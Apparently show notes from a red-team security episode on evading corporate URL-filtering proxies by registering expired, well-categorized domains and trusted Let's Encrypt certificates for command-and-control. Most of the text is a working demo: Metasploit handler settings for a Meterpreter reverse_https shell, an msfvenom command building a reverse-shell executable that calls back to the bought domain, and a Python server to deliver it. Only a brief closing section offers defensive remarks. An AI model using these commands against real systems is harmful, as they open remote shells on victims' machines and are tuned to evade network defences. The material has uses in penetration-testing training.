Meterpreter with Categorized Domains & Trusted Certs – Tradecraft Security Weekly #4

# Bypassing URL Filtering Proxies
- It is common for orgs to proxy web traffic for employees
- They can place restrictions on what websites can be visited, block ads etc...
- Generally accomplished through categorization
- For example: amazon.com would be "Shopping"
- Uncategorized are generally blocked by default

# Locate a Categorized Domain
- One way to bypass is to use a categorized domain for C2
- Can check expireddomains.net for recently expired domains
- Then use DomainHunter to check categorization
- Register a domain that has a "good" categorization
- Modify DNS to point to C2 server
- see http://www.blackhillsinfosec.com/?p=5831

# Trusted Certificates
- An additional precaution to take to ensure the C2 transmission isn't blocked is to use a valid signed certificate
- Follow the instructions for generating a free certificate using Let's Encrypt - https://cerbot.eff.org
- Now we have a categorized domain with a cert that is trusted by most browsers

# Demo
find expired domain with good rep
https://github.com/minisllc/domainhunter
```
# python domainhunter.py -r 4 -c
```
Set up meterpreter listener
```
msf> use exploit/multi/handler
msf> set PAYLOAD windows/meterpreter/reverse_https
msf> set LHOST theexpireddomainwebuy
msf> set LPORT 443
msf> set handlersslcert /root/theexpireddomaincertwecreated.pem
msf> set enablestageencoding true
msf> set exitonsesssion false
msf> set stagerverifysslcert true
msf> exploit -j
```
generate payload
```
# msfvenom -p windows/meterpreter/reverse_https lhost=expiredboughtdomain.com lport=443 -f exe > rev_https.exe
```
host file to deliver
```
python -m SimpleHTTPServer 8000
```
vist https://expiredboughtdomain.com:8000/ and download the executable to the target from the target or via alternate method.
run executable on target and bathe in shells 

# For the blues
- Domain categorization is only a part of defense-in-depth and will likely not prevent all C2 channels
- Some products detect Meterpreter's reverse_https channel but simply adding a different certificate can bypass them









































